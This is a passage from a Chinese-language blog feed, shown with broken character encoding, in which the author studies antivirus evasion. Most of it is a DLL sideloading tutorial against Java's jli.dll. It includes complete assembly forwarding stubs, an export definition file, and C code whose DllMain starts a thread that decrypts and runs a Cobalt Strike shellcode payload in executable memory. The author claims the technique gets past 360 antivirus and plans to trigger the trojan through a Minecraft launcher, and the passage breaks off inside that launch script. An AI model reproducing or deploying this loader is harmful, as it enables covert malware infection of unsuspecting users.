    <link href="/%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/"/>
    <url>/%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B/</url>
    
    <content type="html"><![CDATA[<p>è¶ç°åœ¨å¯¼å¸ˆæ²¡ç»™æˆ‘å¹²ä»€ä¹ˆæ´»ï¼Œä¹Ÿä¸€ç›´æ²¡æœ‰ä»€ä¹ˆç»„ä¼šï¼Œå¤šå­¦ä¸€ç‚¹ä¸œè¥¿ï¼Œå¤§å­¦æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œè€ƒä¸Šç ”ç©¶ç”Ÿåï¼Œä¹‹å‰ä¹Ÿæ˜¯ä¸€ç›´åœ¨ç©ï¼Œè¿™æ˜¯ä¸å¯å–çš„ï¼Œä¸èƒ½å†æµªè´¹ä¸‹å»äº†ã€‚<br>å¾…åšäº‹é¡¹ï¼š</p><ul><li><input disabled="" type="checkbox"> è¿›ä¸€æ­¥å­¦ä¹ å…æ€ï¼ŒåŒ…æ‹¬å­¦ä¹ MalDevAcademyè¯¾ç¨‹ï¼Œä»¥åŠå­¦ä¹ GitHubä¸Šçš„ä¸€äº›å…æ€æŠ€æœ¯å’Œé¡¹ç›®</li><li><input disabled="" type="checkbox"> å­¦ä¹ javaå®‰å…¨ï¼ˆæœ€è¿‘å¼€å§‹ï¼‰</li><li><input disabled="" type="checkbox"> è§‚çœ‹bç«™ä¸Šçš„åˆé›†Â·é»‘å®¢ç»æŠ€ï¼šåˆ›å»ºè‡ªå·±çš„C2ï¼Œè®©ä½ ä¸€é”®getshellï¼ˆ<a href="https://space.bilibili.com/81549960/lists?sid=4517934&amp;spm_id_from=333.788.0.0%EF%BC%89">https://space.bilibili.com/81549960/lists?sid=4517934&amp;spm_id_from=333.788.0.0ï¼‰</a></li><li><input disabled="" type="checkbox"> å‘¨æœ«çš„æ—¶å€™æŒ–æ´ï¼Œäº‰å–èµšåˆ°èµé‡‘</li><li><input disabled="" type="checkbox"> å°è¯•ç¼–å†™è‡ªå·±çš„é¡¹ç›®ï¼šåšå®¢é˜…è¯»å™¨</li><li><input disabled="" type="checkbox"> å­¦ä¹ ä»£ç å®¡è®¡</li><li><input disabled="" type="checkbox"> æ‰“ERTLABS - T&amp;Tçš„çº¢é˜ŸåŸŸæ¸—é€é¶åœº</li><li><input disabled="" type="checkbox"> ç†è´¢èµšé’±</li></ul>]]></content>
    
    
    <categories>
      
      <category>ç”Ÿæ´»</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç™½åŠ é»‘ä¸­å¦‚ä½•ä½¿ç™½ç¨‹åºæ­£å¸¸è¿è¡Œ</title>
    <link href="/%E7%99%BD%E5%8A%A0%E9%BB%91%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%99%BD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C/"/>
    <url>/%E7%99%BD%E5%8A%A0%E9%BB%91%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%99%BD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="ç™½åŠ é»‘åŸç†"><a href="#ç™½åŠ é»‘åŸç†" class="headerlink" title="ç™½åŠ é»‘åŸç†"></a>ç™½åŠ é»‘åŸç†</h1><p>æˆ‘ä»¬çŸ¥é“ç™½åŠ é»‘æŠ€æœ¯çš„åŸç†æ˜¯ç™½ç¨‹åº+é»‘dllï¼Œé»‘dllä¸­åŒ…å«äº†ä¸€äº›æ¶æ„ä»£ç ï¼Œå½“ç™½ç¨‹åºè¿è¡Œæ—¶ï¼Œä¼šåŠ è½½é»‘dllï¼Œä»è€Œæ‰§è¡Œé»‘dllä¸­çš„æ¶æ„ä»£ç ã€‚<br>ä¸ºäº†é«˜æ•ˆç‡å­¦ä¹ ï¼Œç›´æ¥é—®gemini3æ€ä¹ˆå¯ä»¥è®©ç™½ç¨‹åºæ­£å¸¸è¿è¡Œï¼Œä¸å»æœåšå®¢æŠ€æœ¯æ–‡ç« äº†ã€‚<br><img src="https://i.ibb.co/Nd14MrCk/image.png"><br><img src="https://i.ibb.co/rRx29g8s/image.png"><br>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹åŸæ•ˆæœ(æˆ‘ä½¿ç”¨çš„æ˜¯ç”¨source.defæ–‡ä»¶å¯¼å‡ºåŸdllä¸­çš„å‡½æ•°ï¼Œç„¶åç»Ÿä¸€å‘½åä¸ºè‡ªå®šä¹‰å‡½æ•°)<br><img src="https://i.ibb.co/sJ3xvKpQ/image.png"><br>ç»•è¿‡äº†360ï¼Œä½†æ˜¯æ²¡åŠæ³•æ‰§è¡Œå‡ºjavaç‰ˆæœ¬ï¼Œè€Œä¸”è¿›ç¨‹ä¼šé˜»å¡ä½</p><h1 id="é“¾æ¥å™¨æŒ‡ä»¤é™æ€è½¬å‘"><a href="#é“¾æ¥å™¨æŒ‡ä»¤é™æ€è½¬å‘" class="headerlink" title="é“¾æ¥å™¨æŒ‡ä»¤é™æ€è½¬å‘"></a>é“¾æ¥å™¨æŒ‡ä»¤é™æ€è½¬å‘</h1><p>è¯•è¿‡äº†ï¼Œè¢«æ€è½¯æ€çƒ‚äº†ï¼Œç‰¹å¾å¤ªæ˜æ˜¾äº†</p><h1 id="åŸºäºæ±‡ç¼–çš„åŠ¨æ€ä»£ç†"><a href="#åŸºäºæ±‡ç¼–çš„åŠ¨æ€ä»£ç†" class="headerlink" title="åŸºäºæ±‡ç¼–çš„åŠ¨æ€ä»£ç†"></a>åŸºäºæ±‡ç¼–çš„åŠ¨æ€ä»£ç†</h1><p>è·Ÿç€gemini3çš„æ­¥éª¤æ¥<br><img src="https://i.ibb.co/4nWP3Ksr/image.png"><br>å…·ä½“çš„æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs asm">.code<br><br>; å£°æ˜ C ä»£ç é‡Œçš„å…¨å±€å˜é‡ï¼ˆç”¨æ¥å­˜åŸå‡½æ•°çš„çœŸåœ°å€ï¼‰<br>EXTERN pJLI_AddArgsFromEnvVar:QWORD<br>EXTERN pJLI_CmdToArgs:QWORD<br>EXTERN pJLI_GetAppArgIndex:QWORD<br>EXTERN pJLI_GetStdArgc:QWORD<br>EXTERN pJLI_GetStdArgs:QWORD<br>EXTERN pJLI_InitArgProcessing:QWORD<br>EXTERN pJLI_Launch:QWORD<br>EXTERN pJLI_List_add:QWORD<br>EXTERN pJLI_List_new:QWORD<br>EXTERN pJLI_ManifestIterate:QWORD<br>EXTERN pJLI_MemAlloc:QWORD<br>EXTERN pJLI_MemFree:QWORD<br>EXTERN pJLI_PreprocessArg:QWORD<br>EXTERN pJLI_ReportErrorMessage:QWORD<br>EXTERN pJLI_ReportErrorMessageSys:QWORD<br>EXTERN pJLI_ReportExceptionDescription:QWORD<br>EXTERN pJLI_ReportMessage:QWORD<br>EXTERN pJLI_SetTraceLauncher:QWORD<br>EXTERN pJLI_StringDup:QWORD<br><br>; å®šä¹‰å¯¼å‡ºå‡½æ•°ï¼Œæ”¶åˆ°è°ƒç”¨ç›´æ¥é£åˆ°çœŸåœ°å€å»<br>JLI_AddArgsFromEnvVar PROC<br>    jmp pJLI_AddArgsFromEnvVar<br>JLI_AddArgsFromEnvVar ENDP<br><br>JLI_CmdToArgs PROC<br>    jmp pJLI_CmdToArgs<br>JLI_CmdToArgs ENDP<br><br>JLI_GetAppArgIndex PROC<br>    jmp pJLI_GetAppArgIndex<br>JLI_GetAppArgIndex ENDP<br><br>JLI_GetStdArgc PROC<br>    jmp pJLI_GetStdArgc<br>JLI_GetStdArgc ENDP<br><br>JLI_GetStdArgs PROC<br>    jmp pJLI_GetStdArgs<br>JLI_GetStdArgs ENDP<br><br>JLI_InitArgProcessing PROC<br>    jmp pJLI_InitArgProcessing<br>JLI_InitArgProcessing ENDP<br><br>JLI_Launch PROC<br>    jmp pJLI_Launch<br>JLI_Launch ENDP<br><br>JLI_List_add PROC<br>    jmp pJLI_List_add<br>JLI_List_add ENDP<br><br>JLI_List_new PROC<br>    jmp pJLI_List_new<br>JLI_List_new ENDP<br><br>JLI_ManifestIterate PROC<br>    jmp pJLI_ManifestIterate<br>JLI_ManifestIterate ENDP<br><br>JLI_MemAlloc PROC<br>    jmp pJLI_MemAlloc<br>JLI_MemAlloc ENDP<br><br>JLI_MemFree PROC<br>    jmp pJLI_MemFree<br>JLI_MemFree ENDP<br><br>JLI_PreprocessArg PROC<br>    jmp pJLI_PreprocessArg<br>JLI_PreprocessArg ENDP<br><br>JLI_ReportErrorMessage PROC<br>    jmp pJLI_ReportErrorMessage<br>JLI_ReportErrorMessage ENDP<br><br>JLI_ReportErrorMessageSys PROC<br>    jmp pJLI_ReportErrorMessageSys<br>JLI_ReportErrorMessageSys ENDP<br><br>JLI_ReportExceptionDescription PROC<br>    jmp pJLI_ReportExceptionDescription<br>JLI_ReportExceptionDescription ENDP<br><br>JLI_ReportMessage PROC<br>    jmp pJLI_ReportMessage<br>JLI_ReportMessage ENDP<br><br>JLI_SetTraceLauncher PROC<br>    jmp pJLI_SetTraceLauncher<br>JLI_SetTraceLauncher ENDP<br><br>JLI_StringDup PROC<br>    jmp pJLI_StringDup<br>JLI_StringDup ENDP<br><br>END<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯å¯¼å‡ºå®šä¹‰<br><img src="https://i.ibb.co/pv4fc2VT/image.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">LIBRARY <span class="hljs-string">&quot;jli.dll&quot;</span><br>EXPORTS<br><span class="hljs-keyword">JLI_AddArgsFromEnvVar</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_CmdToArgs</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_GetAppArgIndex</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_GetStdArgc</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_GetStdArgs</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_InitArgProcessing</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_Launch</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_List_add</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_List_new</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ManifestIterate</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_MemAlloc</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_MemFree</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_PreprocessArg</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportErrorMessage</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportErrorMessageSys</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportExceptionDescription</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_ReportMessage</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_SetTraceLauncher</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JLI_StringDup</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;rc4.h&quot;</span> <span class="hljs-comment">// ä½ çš„åŠ å¯†å¤´æ–‡ä»¶</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">// 1. å®šä¹‰å…¨å±€æŒ‡é’ˆï¼ˆç»™ ASM ç”¨ï¼‰</span><br>UINT_PTR pJLI_AddArgsFromEnvVar = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_CmdToArgs = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_GetAppArgIndex = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_GetStdArgc = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_GetStdArgs = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_InitArgProcessing = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_Launch = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_List_add = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_List_new = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ManifestIterate = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_MemAlloc = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_MemFree = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_PreprocessArg = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportErrorMessage = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportErrorMessageSys = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportExceptionDescription = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_ReportMessage = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_SetTraceLauncher = <span class="hljs-number">0</span>;<br>UINT_PTR pJLI_StringDup = <span class="hljs-number">0</span>;<br><br>HMODULE hOrg = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// 2. åˆå§‹åŒ–ä»£ç†å‡½æ•°ï¼šåŠ è½½åŸDLLå¹¶è·å–åœ°å€</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">SetupProxies</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hOrg) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// åŠ è½½è¢«æ”¹åçš„åŸDLL</span><br>    hOrg = LoadLibrary(<span class="hljs-string">L&quot;test.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hOrg) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// è·å–çœŸå®åœ°å€å¹¶èµ‹å€¼ç»™å…¨å±€å˜é‡</span><br>    pJLI_AddArgsFromEnvVar = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_AddArgsFromEnvVar&quot;</span>);<br>    pJLI_CmdToArgs = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_CmdToArgs&quot;</span>);<br>    pJLI_GetAppArgIndex = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_GetAppArgIndex&quot;</span>);<br>    pJLI_GetStdArgc = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_GetStdArgc&quot;</span>);<br>    pJLI_GetStdArgs = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_GetStdArgs&quot;</span>);<br>    pJLI_InitArgProcessing = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_InitArgProcessing&quot;</span>);<br>    pJLI_Launch = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_Launch&quot;</span>);<br>    pJLI_List_add = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_List_add&quot;</span>);<br>    pJLI_List_new = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_List_new&quot;</span>);<br>    pJLI_ManifestIterate = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ManifestIterate&quot;</span>);<br>    pJLI_MemAlloc = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_MemAlloc&quot;</span>);<br>    pJLI_MemFree = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_MemFree&quot;</span>);<br>    pJLI_PreprocessArg = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_PreprocessArg&quot;</span>);<br>    pJLI_ReportErrorMessage = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportErrorMessage&quot;</span>);<br>    pJLI_ReportErrorMessageSys = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportErrorMessageSys&quot;</span>);<br>    pJLI_ReportExceptionDescription = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportExceptionDescription&quot;</span>);<br>    pJLI_ReportMessage = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportMessage&quot;</span>);<br>    pJLI_SetTraceLauncher = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_SetTraceLauncher&quot;</span>);<br>    pJLI_StringDup = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_StringDup&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 3. Shellcode åŒºåŸŸ</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123; <br>    <span class="hljs-comment">// ... ä½ çš„ CS Payload ... </span><br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span> <span class="hljs-comment">// ç¤ºä¾‹</span><br>&#125;; <br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[] = &#123; <span class="hljs-number">0x77</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x64</span> &#125;;<br><br><span class="hljs-comment">// 4. æ¶æ„çº¿ç¨‹ï¼šåœ¨åå°è·‘ï¼Œä¸é˜»å¡ä¸»ç¨‹åº</span><br>DWORD WINAPI <span class="hljs-title function_">PayloadThread</span><span class="hljs-params">(LPVOID lpParam)</span> &#123;<br>    SIZE_T size = <span class="hljs-keyword">sizeof</span>(shellcode);<br>    <br>    <span class="hljs-comment">// ç”³è¯·å†…å­˜ (RWX) - ç”Ÿäº§ç¯å¢ƒå»ºè®®å…ˆ RW å†æ”¹æˆ RX</span><br>    LPVOID pMem = VirtualAlloc(<span class="hljs-literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!pMem) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(pMem, shellcode, size);<br>    decrypt_mem(pMem, size, key, <span class="hljs-keyword">sizeof</span>(key)); <span class="hljs-comment">// ä½ çš„è§£å¯†å‡½æ•°</span><br><br>    <span class="hljs-comment">// æ‰§è¡Œ</span><br>    ((<span class="hljs-type">void</span>(*)())pMem)();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 5. DLL å…¥å£</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (dwReason) &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šå¿…é¡»å…ˆåˆå§‹åŒ–ä»£ç†ï¼Œå¦åˆ™ç™½ç¨‹åºè°ƒç”¨å‡½æ•°æ—¶ä¼šè·³åˆ°ç©ºåœ°å€å¯¼è‡´å´©æºƒ</span><br>        SetupProxies(); <br>        <br>        <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šå¯åŠ¨åå°çº¿ç¨‹è·‘é©¬ï¼Œè§£å†³é˜»å¡é—®é¢˜</span><br>        CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, PayloadThread, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">if</span> (hOrg) FreeLibrary(hOrg);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘è¯•è¿‡äº†ï¼Œè¿™æ˜¯éåˆ†ç¦»å¼çš„ä»£ç ï¼Œä¼šè¢«æ€çš„ï¼Œæ‰€ä»¥éœ€è¦åˆ†ç¦»å¼çš„ï¼Œç„¶åå†åŠ ä¸Šä¸€äº›å…æ€æ‰‹æ³•ï¼Œæ˜¯å¯ä»¥è¿‡çš„ï¼Œå…·ä½“ä»£ç æˆ‘å°±ä¸æ”¾äº†ï¼Œåæ­£æ•ˆæœæ˜¯å¯ä»¥æ— æ„Ÿè¿‡360çš„ï¼Œç™½ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œç™½ç¨‹åºæ­£å¸¸è¿è¡Œäº†ä¹‹åï¼Œæ˜¯ä¼šé€€å‡ºçš„ï¼Œæ¯”å¦‚æˆ‘java â€“versionï¼Œæ­£å¸¸è¾“å‡ºç‰ˆæœ¬ä¿¡æ¯ä¹‹åå°±é€€å‡ºäº†ï¼Œè¿™æ—¶æˆ‘çš„shellcodeçº¿ç¨‹ä¹Ÿä¼šé€€å‡ºï¼Œéœ€è¦æ‰¾ä¸ªæ–¹æ³•è§£å†³ï¼Œè€åŠæ³•ï¼Œè¿˜æ˜¯é gemini3ã€‚gemini3ç»™çš„æ–¹æ³•æ˜¯ä½¿ç”¨APCç¨‹æ³¨å…¥ï¼Œæˆ–è€…è®¾ç½®csçš„profileä¸ºä¸€ä¸Šçº¿å°±è¿›è¡Œè¿›ç¨‹æ³¨å…¥ã€‚ä½†æ˜¯æˆ‘æƒ³äº†ä¸€ä¸ªé¬¼ç‚¹å­ã€‚<br>æˆ‘ä»¬éƒ½çŸ¥é“mcç°åœ¨æ˜¯éå¸¸çš„æµè¡Œï¼Œå¾ˆå¤šäººéƒ½ä¼šå®šæœŸæ‰“å¼€mcæ¥ç©å‡ æŠŠï¼Œè€Œmcåˆéœ€è¦ä½¿ç”¨javaï¼Œé‚£æˆ‘ä»¬å¯ä¸å¯ä»¥é€šè¿‡å¯åŠ¨mcæ¥ä¸Šçº¿æœ¨é©¬ï¼Ÿ</p><h1 id="MCä¸Šçº¿æœ¨é©¬"><a href="#MCä¸Šçº¿æœ¨é©¬" class="headerlink" title="MCä¸Šçº¿æœ¨é©¬"></a>MCä¸Šçº¿æœ¨é©¬</h1><p>æˆ‘ä¸€å¼€å§‹å°è¯•çš„æ—¶å€™æ˜¯mcæ­£å¸¸å¯åŠ¨ï¼Œä½†æ˜¯æœ¨é©¬æœªä¸Šçº¿ï¼Œæˆ‘ç™¾æ€ä¸å¾—å…¶è§£ï¼Œç„¶åå°±æŠŠå¯åŠ¨è„šæœ¬å¯¼å‡ºï¼Œå‘ç°æ˜¯å·¥ä½œç›®å½•çš„é—®é¢˜</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span>&gt;<span class="hljs-built_in">nul</span><br>@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">title</span> å¯åŠ¨ - <span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span><br><span class="hljs-built_in">echo</span> æ¸¸æˆæ­£åœ¨å¯åŠ¨ï¼Œè¯·ç¨å€™ã€‚<br><span class="hljs-built_in">cd</span> /D &quot;C:\Users\Lucifer\Desktop\w\.minecraft\versions\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>\&quot;<br><br><br>&quot;C:\Users\Lucifer\Desktop\w\jdk-<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">101</span>-hotspot\bin\java.exe&quot; -Dstderr.encoding=UTF-<span class="hljs-number">8</span> -Dstdout.encoding=UTF-<span class="hljs-number">8</span> -XX:+UseG1GC -XX:-UseAdaptiveSizePolicy -XX:-OmitStackTraceInFastThrow -Djdk.lang.Process.allowAmbiguousCommands=true -Dfml.ignoreInvalidMinecraftCertificates=True -Dfml.ignorePatchDiscrepancies=True -Dlog4j2.formatMsgNoLookups=true -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump &quot;-Djava.library.<span 